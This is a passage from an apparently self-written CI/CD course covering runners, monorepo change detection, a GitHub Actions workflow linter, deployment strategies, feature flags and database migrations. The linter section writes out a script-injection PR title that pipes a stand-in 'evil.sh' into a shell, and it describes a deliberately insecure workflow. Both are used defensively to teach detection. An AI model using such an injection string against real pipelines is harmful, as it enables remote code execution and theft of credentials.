A fresh clone, a new developer, or a new runner would fail. This is the most common cause of "works in CI, fails on a clean checkout", and the reverse, "passed until we replaced the agent".

Persistent runners hide dependencies in many forms: a globally installed package, a tool version the image drifted to, a file in /tmp, a running background process holding a port, a Docker image or volume left behind, an environment variable set once by hand. Mitigations:

  • Clean the workspace at the start of every job (Jenkins cleanWs(), a fresh git clean -ffdx, or actions/checkout with clean: true, which is its default behaviour per the docs).
  • Run jobs in containers or fresh VMs so the base is rebuilt each time.
  • Rebuild the persistent machine image on a schedule from code, so nothing is hand-maintained.
  • Run a periodic clean-room build on an ephemeral runner and alert if it disagrees with the persistent-runner build.

docs.title: Isolation and security
docs.text:
A runner executes code from your repository; with pull requests, that code may be written by someone you do not know. Consequences for self-hosted runners (and a reason the GitHub documentation warns about using them with public repositories):

  • A persistent runner that runs a malicious PR's job can leave behind a backdoor, steal credentials from the environment, or poison caches for the next, privileged job.
  • Anything the runner's network can reach, the job can reach: internal APIs, metadata endpoints, other build agents.
  • Give runners narrow credentials, separate pools for trusted (protected branches) and untrusted (forks) work, and ephemeral lifetimes so each job starts clean.

Docker-in-Docker or a mounted Docker socket on a shared agent hands the job root-equivalent power on the host (Lesson 04).

docs.title: Labels, pools and queueing
docs.text:
Both systems route jobs to runners by labels: runs-on: [self-hosted, linux, gpu] or Jenkins agent { label 'linux && docker' }. A job whose labels no runner has just waits in the queue (check your platform's queue timeout), a frustrating failure that looks like "the pipeline is stuck". Keep a short, documented label vocabulary.

Capacity planning is queueing: if jobs arrive faster than the pool can serve them, they wait, and wait time grows non-linearly as utilisation approaches 100%. A pool at 90% average utilisation has long queues at peak because arrivals are bursty (everyone pushes at 9:30). Autoscaling (create runners on demand from a pool, destroy after use) trades some startup latency, often tens of seconds to minutes, for avoiding idle machines; I measured none of this.

docs.title: Disk, tools and drift
docs.text: A persistent agent accumulates workspaces, Docker layers and caches until the disk fills, and then jobs fail with unrelated "no space left on device" errors (Linux course, Level 1 · 03: inodes). Schedule cleanups and alert on free space. Pin tool versions explicitly in the job (setup-python with a version) instead of relying on what the image happens to have, so an image update cannot change your build silently.

docs.title: Checklist
docs.text:
• Jobs that run untrusted code use ephemeral runners.
  • Persistent runners clean the workspace at the start of every job.
  • Tool versions are pinned in the job, not inherited from the image.
  • Runner images are rebuilt from code on a schedule.
  • Disk space, queue length and runner health are monitored and alerted.
  • Label vocabulary is short and documented.
  • Credentials are issued per job, not baked into the image.
  • Pools are sized for the peak wait target, not the average load.

docs.title: How It Actually Works
docs.text: A runner is a small agent process that holds a connection (long-polling or a persistent socket) to the CI server and asks for work. When the server assigns a job it sends the steps and a short-lived token; the runner checks out code, executes each step as a child process, streams logs back, and reports an exit status per step. Self-hosted GitHub runners make outbound connections only, which is why they work behind firewalls without inbound ports. Jenkins agents historically connect inbound from the controller over SSH or outbound via a JNLP/WebSocket connection. The runner has no idea whether the machine is clean; cleanliness is a property of how you provision the machine around the agent, which is why the ephemeral pattern (create from an image, register, run one job, destroy) is the only design in which "clean" is guaranteed by construction, not by discipline.

docs.title: Common mistakes
docs.text:
• Persistent runners with no cleanup, accumulating stale state and disk usage.
  • Self-hosted runners on public repositories without isolation.
  • Relying on whatever is installed on the image rather than pinning versions.
  • One shared pool for trusted and untrusted work.
  • Label sprawl and jobs that wait forever for a label nobody serves.
  • Sizing the pool for the average rather than the peak.
  • Credentials baked into the runner image instead of issued per job.

docs.title: Exercise
docs.text:
1. Reproduce the stale-workspace demo with minici. Add a clean step at the start and show the first run now fails every time. Is that better or worse? Explain.
  2. List five things that could silently persist on a long-lived Jenkins agent and write one check or cleanup for each.
  3. Your pool serves 8 jobs at once; jobs average 5 minutes and arrive at roughly 90 per hour in a burst at 9:30. Estimate the queueing time and propose a fix.
  4. Write the isolation rules for a runner that builds pull requests from forks.

docs.title: 09 · Monorepos & Path Filters
docs.text:
In a monorepo many projects share one repository. Running every project's pipeline for every change wastes time; running too little lets a change break something unnoticed. The skill is mapping what changed to what must be checked, and being honest about the cases where the mapping is wrong.

What was run

The mapper in src/pathfilter.py was written and tested here: 9 pytest tests pass, including one that builds a real temporary Git repository, makes a commit on a branch, and runs git diff --name-only through the code. GitHub's paths: filters and Jenkins' changeset conditions are described from their documentation and were not run. The glob rules in my code are simplified and differ in details from GitHub's glob syntax, so use the platform's filter in production and my code to understand and test the idea.

docs.title: Why not just run everything
docs.text: A repository with 30 services and a 12-minute test each would cost 6 hours of runner time per push if everything ran. The usual remedies are (in rising order of effort): path filters on the triggers, change detection inside the pipeline, and a build system that understands the dependency graph and caches by input hash (Bazel, Nx, Turborepo, Gradle). This lesson covers the first two.

docs.title: Platform path filters
docs.text:
GitHub Actions' workflow triggers accept paths: and paths-ignore::

on:
  pull_request:
    paths:
      - "services/api/**"
      - "libs/common/**"

The workflow runs only if the changed files match. The pitfall is documented and important: a workflow skipped by a path filter reports no status. If that check is a required status check in branch protection, the PR waits forever on "Expected"; a skipped-by-filter workflow does not count as passing. The standard cure is one always-running workflow that detects changes and a final gate job (Lesson 01), rather than putting required checks behind path filters.

docs.title: Change detection in the pipeline
docs.text:
The plan job asks Git which files differ from the merge base and maps them to projects:

def changed_files(base, head="HEAD"):
    out = run(["git", "diff", "--name-only", f"{base}...{head}"])      # three dots: since the merge base

The three-dot form (base...head) compares head against the merge base of the two, which is "what this branch changed." The two-dot form (base..head) compares the two tips, so changes that landed on base after you branched show up as if you had reverted them. Using the wrong one produces a changed-file list that includes other people's work.

The test test_git_diff_integration builds a repository with services api and web, branches, modifies web, and asserts the changed list is exactly ["services/web/w.py"] and the affected set is ["web"].

docs.title: The mapping and its three categories
docs.text:
P = {"api": ["services/api/**", "libs/common/**"], "web": ["services/web/**", "libs/common/**"], "docs": ["docs/**"]}
G = [".github/workflows/**", "pyproject.toml", "Makefile"]      # affects EVERYTHING

Test results, one assertion per test:

Changed file Affected services/api/app/main.py api libs/common/util.py api, web (shared library fans out to dependents) Makefile api, docs, web (global path) .github/workflows/ci.yml api, docs, web README.md nothing

Three categories of path determine correctness:

  1. Project-local paths: only that project is affected.
  2. Shared paths: a library listed under every dependent project. This list is the thing that goes stale: when web starts importing libs/auth and nobody updates P, changes to auth stop testing web. The failure is silent and appears only when a bug ships. Generate the mapping from the real dependency graph (imports, package manifests) where possible, and add a periodic full run (nightly) to catch drift.
  3. Global paths: CI configuration, root lockfiles, tooling versions. A change here can affect every project, so it triggers all. Forgetting that the pipeline file itself is an input is a classic bug.

The empty result for README.md is a design decision: no project's tests are affected, but something like a docs build might be. Decide explicitly.

docs.title: Glob details that bite
docs.text: My glob translator treats * as "anything except /" and ** as "anything including /". The tests pin three behaviours: a/**/c.txt matches both a/c.txt and a/b/x/c.txt (zero or more directories), src/*.py does not cross into src/sub/, and regex metacharacters in the pattern (a+b.txt) are escaped, so + is literal. That last test guards against a common bug: building the regex by string replacement leaves . and + as operators, which silently over-matches. Real platforms have their own rules for **, negation (!) and case sensitivity; read them rather than assuming mine.

docs.title: Fan-out and dynamic matrices
docs.text: Once you have the affected set, feed it to a matrix: a plan job outputs ["api","web"] as JSON and the test job uses matrix: project: ${{ fromJSON(needs.plan.outputs.projects) }}. If the list is empty, a matrix with zero entries is an error in GitHub Actions, so guard the downstream job with if: needs.plan.outputs.projects != '[]' (per the docs; verify on your platform). The gate job treats a skipped matrix as success only when the plan says nothing was affected.

docs.title: Where monorepo CI goes wrong
docs.text:
• Shallow clones. actions/checkout fetches one commit by default (fetch-depth: 1), so git diff base...HEAD fails or lies because the base commit is missing. Fetch enough history (fetch-depth: 0 or fetch the base explicitly).
  • Base selection. For a pull request the base is the target branch's merge base; for a push to main it is the previous commit or the last green deployment. Choosing "the previous commit" misses a change when the previous push failed: the broken project stops being rechecked once an unrelated commit lands after it. Use "last successfully built commit" for main.
  • Squash and rebase. The merge base changes after a rebase; recompute rather than caching a file list.
  • Generated and vendored files that match a project path but should not trigger it.
  • Version bumps at the root that change every project's dependencies.

docs.title: How It Actually Works
docs.text: git diff --name-only A...B first computes the merge base M of A and B (the most recent common ancestor), then lists files whose content differs between M and B. It reads tree objects and compares blob hashes, so it is cheap even in a large repository: unchanged subtrees are skipped by comparing their hashes without descending. Your mapping function is then pure string matching on those paths, so it is easy to unit test exhaustively, unlike the CI platform's own filter. Build tools such as Bazel go further: they hash the inputs of each target and skip a target whose input hash matches a cached result, which also catches changes through transitive dependencies without a hand-written path list. The price is that the build system must understand every input, which is why adopting it is a large project.

docs.title: Common mistakes
docs.text:
• Required checks behind paths: filters, blocking merges on "expected" statuses.
  • Two-dot diffs that mix in other people's changes.
  • Shallow clone with no history to diff against.
  • A hand-maintained dependency list that drifts from reality.
  • Forgetting global files (CI config, root lockfile, toolchain version).
  • Using the previous commit as the base on main, hiding an earlier failure.
  • No periodic full build, so drift is never noticed.

docs.title: Exercise
docs.text:
1. Run pytest src/test_pathfilter.py -v. Add a project mobile that depends on libs/common and a test showing that a change to libs/common now selects three projects.
  2. Create a repository with two commits on main after you branch. Show the difference between git diff --name-only main..feature and main...feature.
  3. Write the gate job for a workflow where the test job is skipped entirely when no project is affected, so that the required check still passes.
  4. Describe how you would detect that the hand-written dependency mapping has drifted from the actual imports. Sketch the check.

docs.title: 10 · Project — A Workflow Linter
docs.text:
CI configuration is code that runs with credentials, so it deserves the same review and static checks as application code. This project builds wflint.py, a small linter for GitHub Actions workflow files, that catches six common problems from this level and from Level 1. It is a teaching subset: for real use, prefer a maintained tool such as actionlint and a security scanner; they know far more rules and the exact expression grammar.

What was run

The linter has 17 pytest tests, all passing on the first run, plus two demos on this course's own files. It parses YAML with PyYAML and is run on macOS. It was never run against a real, large collection of workflows, so its false-positive and false-negative rates on real code are unknown. The rules encode guidance from docs.github.com's security-hardening pages as I understand them (October 2026); they are not a complete security review.

docs.title: The rules
docs.text: Rule Flags Why it matters W001 No permissions: at the workflow level (and not every job sets one) The token defaults to the repository setting, which may be read-write W002 pull_request_target workflow that checks out the PR head Untrusted code running with a privileged token and secrets W003 uses: not pinned to a 40-hex commit SHA (also applies to reusable-workflow calls) Tags and branches can be moved; a SHA cannot W004 Job without timeout-minutes A hung job runs until the platform limit (hours) W005 Untrusted ${{ github.event... }} inside run: or github-script Script injection W006 Deploy-looking job with no concurrency: Two runs can deploy at once; the older may finish last

docs.title: Handling the on: trap
docs.text: YAML 1.1 reads the bare words on, off, yes, no as booleans, so on: becomes the key True (Level 1 and Lesson 03 hit this). The linter's triggers() function looks up doc.get(True, doc.get("on")) and normalises the three syntaxes (on: push, on: [push, pull], on: {push: {...}}) into a dict. A test asserts the quirk directly: after parsing, True in d and "on" not in d. Without this, every rule that depends on the trigger would silently never fire.

docs.title: Script injection (W005)
docs.text:
- run: echo "Building ${{ github.event.pull_request.title }}"

${{ ... }} is expanded by the runner into the script text before the shell runs it. A pull-request title of "; curl evil.sh | sh; echo " becomes part of the command. The safe form passes the value as data:

- run: echo "Building $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}

Now the shell reads $TITLE as a variable's value and does not parse it as code. The linter's pattern lists contexts an outsider controls (issue and PR titles and bodies, comment bodies, branch names, commit messages) and the tests check both directions: the unsafe form is flagged, the env: form and a safe context (github.sha) are not.

docs.title: Running it
docs.text:
On a deliberately bad workflow (src/bad-workflow.yml: pull_request_target, checks out the PR head, interpolates the title in run, deploys with no timeout/permissions/concurrency/pins):

bad-workflow.yml: W001 ... no workflow-level `permissions:` ...
bad-workflow.yml: W002 deploy.steps[0]: pull_request_target checks out the PR head ...
bad-workflow.yml: W004 deploy: no `timeout-minutes` ...
bad-workflow.yml: W003 deploy.steps[0]: `actions/checkout@v4` not pinned to a full commit SHA ...
bad-workflow.yml: W005 deploy.steps[1]: untrusted `${{ github.* }}` value expanded inside `run:` ...
bad-workflow.yml: W006 deploy: looks like a deploy job with no `concurrency:` ...

All six rules fire. On Level 1's src/ci.yml (the sample workflow I wrote) it reports 4 findings, all W003: the actions are pinned to tags (@v4, @v5), not SHAs. That is the linter being correct: my own sample was written for readability, and the course said so. Exit status is 1 if there are findings and 0 if none, so it works as a CI gate (python3 wflint.py .github/workflows/*.yml).

docs.title: What the tests teach about writing a linter
docs.text:
1. Test both directions. Each rule has a test that triggers it and a test that shows the safe form is not flagged (for example, job-level permissions satisfy W001; a local ./ action is not flagged by W003). A rule that only has positive tests will grow false positives.
  2. Start from a clean baseline workflow (GOOD) and mutate one thing per test. The assertion rules(GOOD) == [] guards against a rule that fires on everything.
  3. Know your limits. W006 guesses "deploy" from words in job id, step names and commands (deploy|release|publish|prod). It will flag a job named pre-release-notes and miss a deploy called ship. Heuristic rules need a way to be suppressed, and a documented rate of error; this tool has the first only by editing the code.
  4. A linter is not a verifier. It reads text; it cannot see that a step downloads and runs a script, or that a permitted action itself is malicious.

docs.title: Extending it
docs.text: Useful next rules, each a small function plus tests: actions/checkout without persist-credentials: false where later steps run untrusted code; curl | sh in run steps; secrets: inherit; runs-on: self-hosted on a pull_request trigger in a public repository; cancel-in-progress: true on a deploy concurrency group; if: always() missing on report-upload steps. Wire it as a required check on the repository containing workflows, and keep an allowlist file with dated exceptions.

docs.title: Checklist
docs.text:
• The linter runs on every change to workflow files and exits non-zero on findings.
  • Suppressions live in a dated allowlist file reviewed regularly.
  • Each rule has a positive test, a negative test and an owner.
  • The linter parses YAML; it does not pattern-match text.
  • Composite actions and reusable workflows in other directories are scanned too.
  • Findings include a location a human can find quickly.
  • False positives are recorded and used to refine rules.
  • Rule ids are stable so suppressions survive upgrades.

docs.title: How It Actually Works
docs.text: The linter does no execution. yaml.safe_load turns the file into nested dictionaries and lists, and each rule walks that structure: iterating jobs, then steps, applying a regular expression to uses: values and run: text. Rules produce (rule id, location, message) tuples, where the location is the YAML path (deploy.steps[1]) so a human can find it; line numbers would need a position-preserving parser such as ruamel.yaml, which I did not use. The SHA check is a 40-character lowercase-hex regular expression, which assumes SHA-1 object IDs; if Git moves to SHA-256 IDs the rule will need updating. Because the whole tool is a pure function from parsed document to findings, every rule is unit-testable with a three-line YAML string, which is why it reached 17 tests with so little code.

docs.title: Common mistakes
docs.text:
• Treating a clean lint run as "secure". It checks six patterns.
  • Pattern-matching YAML as text and tripping on quoting and anchors; parse it.
  • Forgetting the True key and silently skipping trigger-based rules.
  • Rules without a suppression path, leading people to delete the linter.
  • Failing the build on warnings you have not triaged, which gets the gate disabled.
  • Only linting the main workflow directory and missing composite actions and reusable workflows elsewhere.

docs.title: Exercise
docs.text:
1. Run pytest src/test_wflint.py -v, then run wflint.py on your own repository's workflow files. Triage each finding as fix, suppress with a reason, or false positive.
  2. Add rule W007: flag secrets: inherit on reusable-workflow calls. Write the positive and negative tests first.
  3. Make W006 less guessy by also checking environment: against a configurable list of protected environment names.
  4. Write a short policy for when a linter finding may be suppressed, who approves it, and when the suppression expires.

docs.title: Level 3 · Delivery & Release Engineering
docs.text:
Level 2 made the pipeline good at building and testing. Level 3 is about the last mile: getting a change into production safely, being able to undo it, and knowing whether your delivery process is healthy.

What was run, and what wasn't

No deployment, Kubernetes cluster, cloud account, Terraform, Argo CD or signing tool was used. What was run, on macOS: a canary-release simulator with statistics (11 tests), a feature-flag evaluator with deterministic rollout (8 tests), real SQLite schema-migration experiments (expand/contract, including an unexpected failure), a GitOps reconcile loop (8 tests), a plan guard on hand-written plan fixtures (9 tests), a Conventional-Commits version tool (12 tests), a DORA-metrics calculator on a hand-made fixture (6 tests), and a checksum tamper demo. Everything about real platforms comes from documentation or general knowledge, and is labelled as such.

Prerequisites: Levels 1 and 2.

docs.title: Modules
docs.text:
1. Deployment Strategies: recreate, rolling, blue-green, canary, and a measured canary analysis.
  2. Feature Flags: deploy versus release, deterministic percentage rollout, flag debt.
  3. Database Migrations: expand and contract, run on SQLite, including the failures.
  4. Rollbacks: what can be undone and what cannot; roll-forward.
  5. Infrastructure Pipelines: plan, review, apply, state, drift, a destructive-change guard.
  6. GitOps: pull-based reconciliation shown with a tested simulator.
  7. Release Management: semantic versions, Conventional Commits, hotfixes, trains.
  8. Supply-Chain Security: pins, checksums, SBOM, signing, provenance.
  9. DORA Metrics: four delivery measures, computed and how they are gamed.
  10. Project: A Canary Simulator: false-alarm and detection rates across scenarios.

docs.title: After Level 3
docs.text: Level 4 is about running delivery at scale: threat-modelling the pipeline, speed and cost, Jenkins and Actions fleets, audit and compliance, testing the pipelines themselves, incident response, migrating CI systems, golden paths and a capstone delivery platform.

docs.title: 01 · Deployment Strategies
docs.text:
"Deploy" hides a design decision: how do you replace the old version with the new one while users are using it? Each strategy trades risk, cost, speed and complexity differently. This lesson compares the four common ones and then measures the one that needs statistics: the canary.

What was run, and what wasn't

No real deployment was performed (no cluster, load balancer or cloud account). The strategy descriptions are from general practice and the Kubernetes and cloud documentation as I understand them (October 2026) and are not tested here. What I did run is a canary simulator (src/canary.py, 11 pytest tests): synthetic traffic with seeded random errors, compared with a one-sided two-proportion z-test. The detection rates below are properties of that simulation, with 20,000 requests per step, and do not describe any real system.

docs.title: The four strategies
docs.text:
Strategy How Rollback Extra capacity Main risk Recreate Stop the old version, start the new one Redeploy the old one None Downtime between stop and start Rolling Replace instances a few at a time Roll the other way Small surge (e.g. +1 instance) Old and new versions serve traffic together Blue-green Build a full second environment, switch traffic at once Switch back A whole second copy during the cutover Cost; shared database must suit both Canary Send a small share of traffic to the new version, widen if healthy Send it back to 0% Small Needs good metrics and enough traffic to read them

Recreate is honest and simple, and fine for internal tools or maintenance windows. Rolling is the usual default in Kubernetes (maxSurge and maxUnavailable control how many instances may be added or missing during the update; the exact defaults are in the Kubernetes documentation, which I did not run). Because versions overlap, every release must be backward compatible with the previous one for the duration: the same API contract, a database schema both can use (Lesson 03), and compatible message formats.

Blue-green gives an instant switch and an instant switch back, as long as the old environment is kept alive and the database change was compatible. It costs double capacity for the overlap and does not catch problems that appear only under real traffic, since the switch is 0% to 100%.

Canary exposes a small slice of real users first. Its power is in the analysis: a bad release hurts 1% of requests for a few minutes instead of 100% for an hour.

docs.title: Capacity arithmetic for a rolling update
docs.text: Take 10 instances, each handling 100 requests per second, serving 800 req/s of load. With maxUnavailable = 2 the minimum healthy capacity during the update is (10 − 2) × 100 = 800 req/s, exactly the load: zero headroom, so any spike causes errors. With maxUnavailable = 1 the minimum is 900 req/s (12.5% headroom) but the update takes more rounds. A rollout is safe only if capacity at the worst moment exceeds peak load. Compute it before choosing the parameter, not after an incident.

docs.title: Canary analysis, measured
docs.text:
The simulator shifts traffic through steps of 1%, 5%, 25%, 50% and 100%, with 20,000 requests per step. At each step it accumulates counts and runs a one-sided two-proportion z-test on "canary error rate is greater than stable's", rolling back when z exceeds 2.33 (about a 1% one-sided false-alarm rate for a single check) and at least 400 canary requests have been seen.

Results over 300 seeded runs per row (stable error rate 1.0%):

Canary true error rate Rolled back Typical stopping point 1.0% (identical) 13 of 300 (4%) median stop at 5% traffic (when it stopped at all) 1.2% 234 of 300 (78%) median 50% 1.5% 300 of 300 median 25% 2.0% 300 of 300 median 5% 5.0% 300 of 300 median 5%

What these numbers say:

  • Big regressions are caught early: a 5× worse canary was stopped at the 5% step in the median run; the 1% step had only 200 canary requests, below the 400 minimum, so the rule deliberately waited. (Its observed 9% error rate there looks alarming but the sample is small.)
  • Small regressions are caught late or missed: a 20% relative increase (1.0% to 1.2%) was missed in 22% of runs and the median stop was already at 50% traffic.
  • A healthy canary is sometimes rolled back: 4% false rollbacks here. This is the multiple looks problem: five checks at a 1% single-check false-alarm level add up. A stricter threshold lowers false rollbacks and also lowers sensitivity, an unavoidable trade.

My first draft of the test for "a small regression is usually missed" was wrong: with 20,000 requests per step the detector catches 1.0% → 1.2% far more often than I predicted. I replaced it with the measured result (more than 55 of 100 caught) and a test that false rollbacks stay under 10%.

docs.title: What to measure in a real canary
docs.text:
Error rate alone is not enough. Compare the canary against the stable fleet over the same period (not against last week, because time of day changes traffic): error rate, latency percentiles, saturation (CPU, memory), and a business metric where possible (checkout completions). Watch out for:

  • Too little traffic to see a small effect: at low volume a canary can never prove anything, and the right answer may be a longer bake time or a synthetic load.
  • Sticky sessions and caches: a user bounced between versions sees inconsistent behaviour; route by user ID hash (Lesson 02) so each user sees one version.
  • Different populations: the canary must receive a representative sample, not only internal users or one region.

docs.title: Choosing a strategy
docs.text:
• Stateless service, good metrics, enough traffic → canary (automated if you trust the analysis).
  • Need a fast, rehearsed switch-back and can afford double capacity → blue-green.
  • Small team, small service → rolling, with health checks and a sane maxUnavailable.
  • A schema or protocol change that cannot be made compatible → recreate in a planned window, or redesign the change (Lesson 03).

Rarely is one strategy right for everything; the point is to choose deliberately and rehearse the rollback (Lesson 04).

docs.title: Checklist
docs.text:
• The worst-moment capacity of a rolling update exceeds peak load.
  • Adjacent versions are compatible in API, schema and message formats.
  • Canary analysis compares against the concurrent stable fleet.
  • A missing metric stops the rollout instead of promoting it.
  • Rollback has been rehearsed this quarter.
  • The minimum sample size for a decision is written down and justified.

docs.title: How It Actually Works
docs.text: All four strategies reduce to controlling which instances receive which share of requests. A load balancer or service mesh holds a set of backends with weights; a rolling update changes membership gradually, blue-green swaps the whole set atomically (a DNS change is not atomic because of caching, so a load-balancer target switch is preferred), and a canary assigns a small weight to a new group. Health checks decide which backends are eligible: an instance that fails its readiness probe is removed from rotation without being killed. The automation on top is a loop: set weight, wait, read metrics, decide. The statistics in the simulator are the "decide" part. The traffic share you can safely start with is limited by how fast your metrics arrive: a metric with a 5-minute delay cannot protect a 2-minute step.

docs.title: Common mistakes
docs.text:
• No backward compatibility between adjacent versions during a rolling update.
  • Zero capacity headroom at the worst moment of an update.
  • A canary with too little traffic to ever detect a regression.
  • Comparing the canary to history instead of to the concurrent stable fleet.
  • Only watching error rate, missing latency and saturation.
  • Treating blue-green as free rollback after an incompatible database change.
  • Never testing rollback, discovering it is broken during an incident.
  • Auto-promoting on silence: a missing metric must be a failure, not a pass.

docs.title: Exercise
docs.text:
1. Run pytest src/test_canary.py -v. Then change requests_per_step to 2,000 and re-measure the detection rate for 1.0% vs 1.2%. What happens, and what does it mean for a low-traffic service?
  2. For a service of 6 instances at 50 req/s capacity each and a peak load of 220 req/s, choose maxUnavailable and justify it.
  3. Add a latency comparison to the simulator (e.g. a t-test on mean latency) and decide how to combine it with the error-rate test.
  4. Write the rollback criteria for a canary as numbers (error-rate delta, latency delta, minimum sample) and defend each.

docs.title: 02 · Feature Flags: Decoupling Deploy from Release
docs.text:
A deploy puts code on servers. A release exposes behaviour to users. Without flags, those are one event, so every deploy is a launch and every launch is a risk. A feature flag is a runtime condition around new behaviour: if flag("new-checkout", user): ... else: .... Code ships dark, then is turned on for staff, 1% of users, 10%, everyone, or turned off again in seconds without a deploy.

What was run

The flag evaluator in src/flags.py and its 8 pytest tests were written and run here. The percentage-rollout numbers come from hashing 20,000 synthetic user IDs. Hosted flag services (LaunchDarkly, Unleash, OpenFeature-compatible systems) were not used; the descriptions of what such services provide are general, not product claims.

docs.title: Deterministic percentage rollout
docs.text:
The core design question: how do you serve a feature to "10% of users" so that a given user gets a consistent answer, and so that going from 10% to 20% only adds users? Random choice per request fails both. The standard answer is to hash a stable identifier into a bucket:

def bucket(flag, user_id, buckets=10000):
    h = hashlib.sha256(f"{flag}:{user_id}".encode()).digest()
    return int.from_bytes(h[:8], "big") % buckets

# rule {"percent": 10} serves the user when bucket < 10 * 100 = 1000 of 10000

Measured:

flag 10% over 20,000 users -> 2007 enabled  (10.04%)
5,000 users at 10% -> 483 enabled, at 20% -> 989 enabled, 10%-set is a subset of the 20%-set: True

The share is within a few hundredths of a percent of the target and, because the bucket depends only on (flag, user), raising the percentage never removes anyone (the subset test). Salting the hash with the flag name matters: without it every flag would use the same bucket for a user, so the same 10% of users would be the guinea pigs for every experiment. A test confirms the same user lands in different buckets for different flags.

docs.title: Rules, defaults and the kill switch
docs.text:
The evaluator walks an ordered rule list, first match wins:

  1. Attribute rules (email_domain == corp.example → on) for staff dogfooding.
  2. Percentage rule (10% on).
  3. Otherwise the flag's default.

An enabled: false switch short-circuits everything and returns the default. The test test_kill_switch_overrides_rules verifies that even rules that would serve True are ignored. The kill switch is the safety feature that makes flags worth having, and it must work without a deploy and without the flag service being healthy: if the flag backend is down, the client must fall back to a safe built-in default, not throw.

Define "safe default" per flag. For a risky new path it is off; for a flag that disables a dangerous old behaviour it may be on. Decide in code review.

docs.title: Types of flags have different lifetimes
docs.text:
Type Purpose Lifetime Release flag Hide unfinished or risky work Days to weeks, then delete Experiment flag A/B test with measurement Until the experiment concludes Ops flag / kill switch Disable a feature under load or incident Long-lived by design Permission flag Entitlements per customer Long-lived (really a product feature)

Most flag trouble comes from treating them alike. Release flags are supposed to be deleted after rollout.

docs.title: Flag debt
docs.text:
Every flag doubles the states your code can be in: two flags give four combinations, ten give 1,024, and nobody tests them all. Old flags left in place make code hard to read, hide dead branches, and eventually the "off" path rots because nobody runs it, so the kill switch no longer works when needed. Practices that keep this under control:

  • Every release flag has an owner and an expiry date at creation, and a ticket to remove it.
  • A report lists flags that have been 100% on (or off) for more than N days.
  • CI checks that both states of a new flag are tested, at least for the critical path.
  • Remove the flag in the same pull request that deletes the old code path.

docs.title: Flags and the pipeline
docs.text:
Flags change what "tested" means. The pipeline tests the code with whatever flag configuration the test sets; production runs a configuration that was never tested (flags are changed at runtime). So: test the default production configuration and the next configuration (flag on), and treat a flag change as a change with an audit trail (who changed it, when, to what), ideally with the same approval you would require for a deploy for high-risk flags. Flag changes cause real incidents, and they are often invisible to the deployment dashboard.

Flags also interact with canaries (Lesson 01): a canary tests new code; a flag rollout tests new behaviour. Using both, deploy the code everywhere with the flag off, then ramp the flag. If a problem appears, turning the flag off is faster than rolling back a deployment.

docs.title: Evaluating where? Consistency and performance
docs.text: Evaluating a flag should be cheap and local: fetch the rule set once, cache it, and update via a stream or periodic poll, then evaluate in-process. A network call per evaluation adds latency and a new failure mode. Be careful about evaluating the same flag at several places in one request, which could give inconsistent answers if the rules change mid-request; evaluate once per request and pass the result down.

docs.title: How It Actually Works
docs.text: The flag configuration is data (JSON) distributed to the application. The SDK holds the rules in memory and evaluates them with a pure function of (config, user), exactly as evaluate() here does. Because it is a pure function, it is trivially testable and deterministic. The hash-based bucket is a uniform pseudo-random mapping from (flag, user) to an integer; SHA-256's output is close enough to uniform that a modulo of its first 8 bytes is balanced to within sampling noise (the 10.04% result). The subset property follows from using a fixed bucket per user and varying only the threshold. Changing the salt (or the bucket count) reshuffles everyone, which is why rollouts should never edit the hashing key mid-experiment.

docs.title: Common mistakes
docs.text:
• Random-per-request rollout, giving users inconsistent experiences.
  • No per-flag salt, so the same users are always in every experiment.
  • No safe default if the flag service is unreachable.
  • Release flags that live forever, plus untested "off" paths.
  • Changing flags without an audit trail or approval for risky ones.
  • Using flags for long-term permissions without calling them what they are.
  • Evaluating the same flag many times in one request with changing answers.
  • Putting secrets or personal data in flag rules distributed to clients.

docs.title: Exercise
docs.text:
1. Run pytest src/test_flags.py -v. Then remove the flag name from the hash input and show that two different flags now select the same 10% of users.
  2. Add a rule type {"user_ids": [...], "serve": ...} that takes precedence for a list of beta users, with tests.
  3. Plan the removal of a release flag that has been 100% on for three weeks: list every file and test to touch, and the order.
  4. Write the incident runbook for "turn off the new checkout": who may flip it, how quickly it takes effect everywhere, and how you verify.

docs.title: 03 · Database Migrations: Expand & Contract
docs.text:
Code deploys can be rolled back in seconds. Schema changes usually cannot. The database is shared by every running version, by migrations, by batch jobs and by humans with a SQL console, and once data is changed or destroyed, redeploying old code does not bring it back. Zero-downtime delivery therefore needs one rule above all: each step of a change must work with both the code before it and the code after it.

What was run

Experiments ran on SQLite 3.53.4 through Python's sqlite3 module, on tiny in-memory tables, using ALTER TABLE ... RENAME COLUMN, ADD COLUMN, DROP COLUMN and a trigger. SQLite is not PostgreSQL or MySQL: locking behaviour, online-DDL support and transactional DDL differ a lot between engines, and I did not run any of those. What the experiment shows is the logical compatibility problem, which is engine-independent; claims about locks and downtime on real engines are general and untested here.

docs.title: The naive rename breaks the old version
docs.text:
You want users.name to become users.full_name. The one-statement way:

ALTER TABLE users RENAME COLUMN name TO full_name
old app  (SELECT name ...)       -> ERROR: no such column: name
new app  (SELECT full_name ...)  -> ('Ada',)

The new code works and the old code, still running during a rolling deploy (Lesson 01) or a rollback, fails immediately. Every request served by an old instance errors until the deploy finishes, and a rollback of the code would fail the other way. The migration and the deploy are separate events and neither can be atomic with the other.

docs.title: The expand / migrate / contract sequence
docs.text:
Split the change into steps, each compatible with its neighbours:

  1. Expand: add the new column, nullable, with no constraint the old code would violate. 
    ALTER TABLE users ADD COLUMN full_name TEXT
old app -> ('Ada',)     new app (before backfill) -> (None,)
    Both versions run. The new column is empty, so the new code must tolerate NULL for now.
  2. Backfill: copy existing values (UPDATE users SET full_name = name WHERE full_name IS NULL). After it, [(1,'Ada','Ada'), (2,'Bob','Bob')]. On a large table do this in batches so no single statement holds locks for long or bloats the transaction log.
  3. Dual write: the application now writes both columns, or a database trigger keeps them in sync. This closes the gap that I measured next.
  4. Switch reads to the new column once the backfill is verified complete.
  5. Contract: stop writing the old column, wait until no running or rollback-target version needs it, then drop it.

docs.title: The gap that backfill alone leaves
docs.text:
After step 2, the old app is still running and inserting rows. I inserted (3, 'Cy') through the old code path (it only knows name):

row written by OLD app after backfill, new column: (None,)

full_name is NULL for that row, so the new code, which reads full_name, sees a user with no name. A one-time backfill is never enough while old writers exist. The fix is dual-writing from the new code and, for old writers you cannot change quickly, a sync trigger:

CREATE TRIGGER sync AFTER INSERT ON users WHEN NEW.full_name IS NULL
BEGIN UPDATE users SET full_name = NEW.name WHERE id = NEW.id; END
insert via old code after the trigger -> full_name = 'Di'

docs.title: A surprise when contracting
docs.text:
Dropping the old column while the trigger still referenced it failed:

